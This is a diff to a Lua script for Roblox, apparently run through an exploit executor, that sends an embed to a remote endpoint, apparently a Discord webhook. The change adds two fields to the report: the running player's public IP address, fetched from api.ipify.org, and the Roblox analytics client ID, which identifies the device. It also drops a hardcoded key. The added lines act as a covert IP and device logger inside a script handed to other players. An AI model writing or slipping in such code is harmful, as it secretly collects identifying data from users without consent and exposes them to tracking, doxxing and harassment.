@@ -26,7 +26,7 @@ local response = request({
         ["embeds"] = {
             {
                 ["title"] = "",
-                ["description"] = game.Players.LocalPlayer.Name .." Successfully Executed and passed the Key System",
+                ["description"] = game.Players.LocalPlayer.Name .." Logged into the script",
                 ["type"] = "rich",
                 ["color"] = tonumber(0xffffff),
                 ["fields"] = {
@@ -44,8 +44,13 @@ local response = request({
                             game.Players.LocalPlayer.UserId,
                         ["inline"] = true
                     }, {
-                        ["name"] = "Key : ",
-                        ["value"] = "Caseis187member",
+                        ["name"] = "IP: ",
+                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
+                        ["inline"] = true
+                    }, {
+                        ["name"] = "Client Id : ",
+                        ["value"] = game:GetService("RbxAnalyticsService")
+                            :GetClientId(),
                         ["inline"] = true
                     }
                 }
@@ -53,7 +58,6 @@ local response = request({
         }
     })
 })
-
 --Services
 Workspace = game:GetService('Workspace')
 Players = game:GetService('Players')
